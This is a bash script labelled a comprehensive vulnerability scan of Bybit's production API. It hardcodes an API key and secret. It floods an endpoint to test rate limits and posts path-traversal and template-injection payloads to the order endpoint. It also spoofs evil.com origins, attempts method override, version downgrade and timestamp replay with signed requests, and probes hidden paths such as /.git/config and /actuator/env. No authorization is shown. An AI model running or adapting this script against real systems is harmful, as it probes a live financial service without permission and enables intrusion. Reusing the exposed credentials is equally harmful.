#!/bin/bash
# BYBIT COMPREHENSIVE VULNERABILITY SCAN (Nov 2025)
# Focus: Public endpoints, Rate Limit, Info Disclosure, Business Logic
# No special permissions needed

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"

echo "=============================================================="
echo "BYBIT COMPREHENSIVE VULNERABILITY SCAN"
echo "Date: $(date)"
echo "=============================================================="

# ============================================================
# 1. RATE LIMIT BYPASS (Public endpoints)
# ============================================================
echo ""
echo "[1] RATE LIMIT BYPASS TEST"
echo "--------------------------------------------------------------"

echo "Sending 200 rapid requests to /v5/market/tickers..."
success=0
for i in {1..200}; do
    resp=$(curl -s "$BASE/v5/market/tickers?category=linear&symbol=BTCUSDT" -w "%{http_code}" -o /dev/null)
    if [ "$resp" == "200" ]; then
        ((success++))
    fi
done
echo "  Success: $success/200"
if [ $success -gt 190 ]; then
    echo "  ⚠️  WEAK RATE LIMITING! 95%+ success on rapid requests"
fi

# ============================================================
# 2. INFORMATION DISCLOSURE IN ERROR MESSAGES
# ============================================================
echo ""
echo "[2] INFORMATION DISCLOSURE IN ERRORS"
echo "--------------------------------------------------------------"

# Test malformed requests for stack traces
payloads=(
    '{"invalid": true}'
    '{"symbol": "INVALID", "side": "Buy", "qty": "NaN"}'
    '{"symbol": "../../../etc/passwd"}'
    '{"symbol": "${7*7}"}'
    '{"symbol": "{{7*7}}"}'
)

for p in "${payloads[@]}"; do
    echo "  Testing: ${p:0:40}..."
    resp=$(curl -s -X POST "$BASE/v5/order/create" \
        -H "Content-Type: application/json" \
        -d "$p")
    
    # Check for sensitive info in error
    if echo "$resp" | grep -qiE "stack|trace|exception|internal|debug|path|file"; then
        echo "    🚨 SENSITIVE INFO IN ERROR!"
        echo "    $resp"
    fi
done

# ============================================================
# 3. CORS MISCONFIGURATION
# ============================================================
echo ""
echo "[3] CORS MISCONFIGURATION"
echo "--------------------------------------------------------------"

origins=(
    "https://evil.com"
    "https://bybit.com.evil.com"
    "https://bybitcom.evil.com"
    "null"
)

for origin in "${origins[@]}"; do
    echo "  Testing Origin: $origin"
    resp=$(curl -s -I "$BASE/v5/market/time" -H "Origin: $origin" | grep -i "access-control")
    if echo "$resp" | grep -qi "$origin"; then
        echo "    🚨 CORS ALLOWS MALICIOUS ORIGIN!"
        echo "    $resp"
    fi
done

# ============================================================
# 4. HTTP METHOD OVERRIDE
# ============================================================
echo ""
echo "[4] HTTP METHOD OVERRIDE"
echo "--------------------------------------------------------------"

echo "  Testing X-HTTP-Method-Override..."
resp=$(curl -s -X POST "$BASE/v5/user/query-api" \
    -H "X-HTTP-Method-Override: GET" \
    -H "X-BAPI-API-KEY: $API_KEY")
    
if echo "$resp" | grep -q '"retCode":0'; then
    echo "    🚨 METHOD OVERRIDE WORKS!"
fi

# ============================================================
# 5. PARAMETER POLLUTION
# ============================================================
echo ""
echo "[5] PARAMETER POLLUTION"
echo "--------------------------------------------------------------"

echo "  Testing duplicate params..."
resp=$(curl -s "$BASE/v5/market/tickers?category=linear&symbol=BTCUSDT&symbol=ETHUSDT")
symbols=$(echo "$resp" | grep -o '"symbol":"[^"]*"' | wc -l)
echo "    Got $symbols symbols in response"
if [ $symbols -gt 1 ]; then
    echo "    ⚠️  Both symbols accepted - potential pollution"
fi

# ============================================================
# 6. WEBSOCKET AUTH BYPASS
# ============================================================
echo ""
echo "[6] WEBSOCKET AUTHENTICATION CHECK"
echo "--------------------------------------------------------------"

# Check if private WS accepts connection without auth
echo "  Testing private WebSocket without auth..."
# Using timeout as wscat might hang
timeout 5 bash -c 'echo "{\"op\":\"subscribe\",\"args\":[\"position\"]}" | websocat -t wss://stream.bybit.com/v5/private 2>&1' | head -5 || echo "  Connection closed (expected)"

# ============================================================
# 7. API VERSION DOWNGRADE
# ============================================================
echo ""
echo "[7] API VERSION DOWNGRADE ATTACK"
echo "--------------------------------------------------------------"

echo "  Testing old API versions..."
old_endpoints=(
    "/v2/public/tickers"
    "/v2/private/wallet/balance"
    "/open-api/wallet/balance"
    "/spot/v1/account"
)

for ep in "${old_endpoints[@]}"; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$ep")
    echo "    $ep: HTTP $resp"
    if [ "$resp" == "200" ]; then
        echo "    🚨 OLD API STILL ACCESSIBLE!"
    fi
done

# ============================================================
# 8. TIMESTAMP MANIPULATION
# ============================================================
echo ""
echo "[8] TIMESTAMP MANIPULATION"
echo "--------------------------------------------------------------"

# Get server time
SERVER_TIME=$(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4)
echo "  Server time: $SERVER_TIME"

# Try with future timestamp
FUTURE_TS=$((SERVER_TIME + 86400))000  # +1 day
PAST_TS=$((SERVER_TIME - 86400))000    # -1 day

for ts in "$FUTURE_TS" "$PAST_TS"; do
    # Generate signature for test
    PAYLOAD=""
    SIGN=$(echo -n "${ts}${API_KEY}5000${PAYLOAD}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    
    resp=$(curl -s "$BASE/v5/user/query-api" \
        -H "X-BAPI-API-KEY: $API_KEY" \
        -H "X-BAPI-SIGN: $SIGN" \
        -H "X-BAPI-SIGN-TYPE: 2" \
        -H "X-BAPI-TIMESTAMP: $ts" \
        -H "X-BAPI-RECV-WINDOW: 5000")
    
    code=$(echo "$resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
    if [ "$code" == "0" ]; then
        echo "    🚨 TIMESTAMP $ts ACCEPTED!"
    else
        echo "    Timestamp $ts rejected (Code: $code)"
    fi
done

# ============================================================
# 9. NEGATIVE VALUES / INTEGER OVERFLOW
# ============================================================
echo ""
echo "[9] NEGATIVE VALUES / INTEGER OVERFLOW"
echo "--------------------------------------------------------------"

echo "  Testing public orderbook with manipulated params..."
test_vals=(
    "limit=-1"
    "limit=0"
    "limit=99999999"
    "limit=2147483648"  # INT_MAX + 1
)

for val in "${test_vals[@]}"; do
    resp=$(curl -s "$BASE/v5/market/orderbook?category=linear&symbol=BTCUSDT&$val")
    code=$(echo "$resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
    echo "    $val: retCode=$code"
    if [ "$code" == "0" ]; then
        data_len=$(echo "$resp" | wc -c)
        echo "      Response size: $data_len bytes"
    fi
done

# ============================================================
# 10. HIDDEN ENDPOINTS DISCOVERY
# ============================================================
echo ""
echo "[10] HIDDEN ENDPOINTS DISCOVERY"
echo "--------------------------------------------------------------"

hidden_paths=(
    "/v5/admin/users"
    "/v5/internal/config"
    "/v5/debug/info"
    "/v5/test/echo"
    "/actuator/health"
    "/actuator/env"
    "/swagger.json"
    "/api-docs"
    "/.git/config"
    "/v5/user/all-api-keys"
    "/v5/broker/sub-deposit-record"
)

for path in "${hidden_paths[@]}"; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$path")
    if [ "$resp" != "404" ] && [ "$resp" != "403" ]; then
        echo "    🚨 $path: HTTP $resp"
    fi
done

echo ""
echo "=============================================================="
echo "SCAN COMPLETE"
echo "=============================================================="
